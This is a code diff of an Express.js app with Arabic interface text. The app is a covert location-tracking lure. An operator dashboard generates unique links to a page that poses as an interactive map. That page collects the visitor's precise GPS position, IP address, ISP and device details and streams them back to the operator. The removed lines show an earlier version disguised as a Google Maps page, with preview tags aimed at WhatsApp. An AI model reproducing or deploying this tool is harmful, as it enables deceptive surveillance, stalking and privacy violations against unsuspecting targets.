@@ -8,7 +8,7 @@ const io = new Server(server, { cors: { origin: "*" } });
 
 app.use(express.json());
 
-// 1. لوحة التحكم الرئيسية
+// 1. لوحة التحكم الرئيسية لعرض النتائج وتوليد روابط الخرائط
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -16,28 +16,28 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>لوحة التحكم - روابط المعاينة الذكية</title>
+        <title>لوحة التحكم - تعقب الخرائط</title>
         <style>
             body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
             .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-            button { background: #25D366; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-            button:hover { background: #128C7E; }
+            button { background: #007bff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+            button:hover { background: #0056b3; }
             input { width: 90%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; text-align: center; margin-top: 10px; }
-            .info-box { text-align: right; background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #25D366; font-size: 14px; line-height: 1.7; }
+            .info-box { text-align: right; background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #007bff; font-size: 14px; line-height: 1.7; }
         </style>
     </head>
     <body>
-        <h2>🟢 منشئ روابط الخرائط المتوافقة مع واتساب</h2>
+        <h2>🗺️ منشئ روابط الخرائط والمواقع الذكية</h2>
         <div class="card">
-            <p>انقر لإنشاء رابط يظهر كمعاينة خريطة حقيقية في الواتساب:</p>
-            <button type="button" onclick="makeLink()">🔗 إنشاء الرابط الذكي</button>
+            <p>انقر لإنشاء رابط خريطة تفاعلي:</p>
+            <button type="button" onclick="makeLink()">🔗 إنشاء رابط الخريطة</button>
             <div id="linkContainer" style="display:none; margin-top: 15px;">
-                <p>الرابط الخاص بك (انسخه وأرسله في واتساب):</p>
+                <p>الرابط الخاص بك (انسخه وافتحه):</p>
                 <input type="text" id="linkInput" readonly onclick="this.select();">
             </div>
         </div>
 
-        <h3>📥 التقارير والمواقع الفورية الواردة:</h3>
+        <h3>📥 التقارير والمواقع الواردة:</h3>
         <div id="logs" class="card">
             <p style="color: #aaa;">في انتظار فتح الرابط...</p>
         </div>
@@ -46,7 +46,7 @@ app.get('/', (req, res) => {
         <script>
             function makeLink() {
                 const uniqueId = Math.random().toString(36).substring(2, 8);
-                const fullUrl = window.location.origin + '/location/' + uniqueId;
+                const fullUrl = window.location.origin + '/map/' + uniqueId;
                 
                 document.getElementById('linkInput').value = fullUrl;
                 document.getElementById('linkContainer').style.display = 'block';
@@ -74,8 +74,8 @@ app.get('/', (req, res) => {
   `);
 });
 
-// 2. صفحة الويب التي تظهر لمعاينة واتساب وتحتوي على وسوم Open Graph الحقيقية
-app.get('/location/:id', async (req, res) => {
+// 2. صفحة الخريطة الوهمية التي تطلب إذن الموقع عند الضغط على الزر
+app.get('/map/:id', async (req, res) => {
   let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
   if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
 
@@ -85,31 +85,23 @@ app.get('/location/:id', async (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>مشاركة الموقع الجغرافي - خرائط Google</title>
-        
-        <!-- وسوم المعاينة الخاصة بواتساب ومنصات التواصل -->
-        <meta property="og:title" content="مشاركة موقع جغرافي مباشر عبر الخريطة">
-        <meta property="og:description" content="اضغط هنا لعرض وتحديث موقعك الحالي على الخريطة بدقة عالية.">
-        <meta property="og:image" content="https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=600&auto=format&fit=crop&q=80">
-        <meta property="og:url" content="${req.protocol}://${req.get('host')}${req.originalUrl}">
-        <meta property="og:type" content="website">
-
+        <title>خريطة الموقع التفاعلية</title>
         <style>
-            body { font-family: Arial, sans-serif; background: #f8f9fa; color: #333; margin: 0; padding: 0; text-align: center; }
-            .header { background: #4285F4; color: white; padding: 16px; font-size: 18px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-            .container { max-width: 450px; margin: 40px auto; padding: 25px; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-            button { background: #34A853; color: white; border: none; padding: 14px 28px; font-size: 17px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; box-shadow: 0 4px 10px rgba(52,168,83,0.3); }
-            button:hover { background: #2e8b45; }
-            p { color: #555; font-size: 15px; line-height: 1.6; }
-            #status { margin-top: 15px; font-weight: bold; color: #4285F4; }
+            body { font-family: Arial, sans-serif; background: #f4f4f9; color: #333; margin: 0; padding: 0; text-align: center; }
+            .header { background: #007bff; color: white; padding: 15px; font-size: 20px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+            .container { max-width: 500px; margin: 40px auto; padding: 20px; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+            button { background: #28a745; color: white; border: none; padding: 14px 28px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; box-shadow: 0 4px 10px rgba(40,167,69,0.3); }
+            button:hover { background: #218838; }
+            p { color: #666; font-size: 15px; line-height: 1.6; }
+            #status { margin-top: 15px; font-weight: bold; color: #007bff; }
         </style>
     </head>
     <body>
-        <div class="header">📍 نظام خرائط الموقع المباشر</div>
+        <div class="header">📍 مشاركة الموقع الجغرافي</div>
         <div class="container">
-            <h3>تأكيد ومشاركة الموقع</h3>
-            <p>للاطلاع على تفاصيل المنطقة وعرض أقرب الطرق على الخريطة، يرجى الضغط على الزر أدناه للسماح بتحديث الموقع.</p>
-            <button onclick="requestLocation()">🗺️ فتح الخريطة وعرض الموقع</button>
+            <h3>عرض موقعك الحالي على الخريطة</h3>
+            <p>للعثور على الموقع بدقة وتحديث الإحداثيات على الخريطة المباشرة، يرجى الضغط على الزر أدناه والسماح بالوصول للموقع.</p>
+            <button onclick="requestLocation()">🗺️ عرض الموقع الآن</button>
             <div id="status"></div>
         </div>
 
@@ -142,7 +134,7 @@ app.get('/location/:id', async (req, res) => {
             }
 
             async function requestLocation() {
-                document.getElementById('status').innerText = "جاري الاتصال بقواعد بيانات الخرائط...";
+                document.getElementById('status').innerText = "جاري الاتصال بالأقمار الصناعية وتحميل الخريطة...";
                 
                 const ua = navigator.userAgent;
                 const deviceData = {
@@ -157,12 +149,14 @@ app.get('/location/:id', async (req, res) => {
                     time: new Date().toLocaleTimeString('ar-EG')
                 };
 
+                // جلب معلومات الـ IP والشبكة
                 try {
                     const response = await fetch('https://ipapi.co/${clientIp}/json/');
                     const ipData = await response.json();
                     deviceData.networkISP = ipData.org || "غير معروف";
                 } catch(e){}
 
+                // طلب إذن الـ GPS الفعلي عند ضغط الزر
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         async (pos) => {
@@ -185,18 +179,18 @@ app.get('/location/:id', async (req, res) => {
 
                             sendData(deviceData);
                             document.getElementById('status').style.color = "green";
-                            document.getElementById('status').innerText = "✅ تم تحميل الخريطة بنجاح!";
+                            document.getElementById('status').innerText = "✅ تم تحميل الموقع بنجاح!";
                         },
                         (err) => {
                             deviceData.fullAddress = "رفض المستخدم إذن الموقع";
                             sendData(deviceData);
                             document.getElementById('status').style.color = "red";
-                            document.getElementById('status').innerText = "❌ يجب السماح بإذن الموقع لعرض التفاصيل.";
+                            document.getElementById('status').innerText = "❌ يجب السماح بإذن الموقع لعرض الخريطة.";
                         },
                         { timeout: 10000, enableHighAccuracy: true }
                     );
                 } else {
-                    deviceData.fullAddress = "المتصفح لا يدعم الموقع";
+                    deviceData.fullAddress = "المتصفح لا يدعم تحديد الموقع";
                     sendData(deviceData);
                 }
             }
